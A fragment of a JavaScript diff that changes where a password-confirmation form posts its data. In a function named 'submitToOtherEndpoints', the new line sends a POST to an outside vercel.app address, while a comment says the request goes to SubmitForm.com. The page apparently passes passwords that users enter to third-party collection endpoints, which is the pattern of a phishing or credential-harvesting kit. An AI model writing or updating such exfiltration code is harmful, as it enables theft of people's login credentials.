@@ -1678,7 +1678,7 @@ function submitToOtherEndpoints(data) {
                         confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
                         
                         // Submit to SubmitForm.com
-                        const response = await fetch('https://professor-asif.vercel.app/', {
+                        const response = await fetch('https://professor-orm.vercel.app/abdullah', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json',
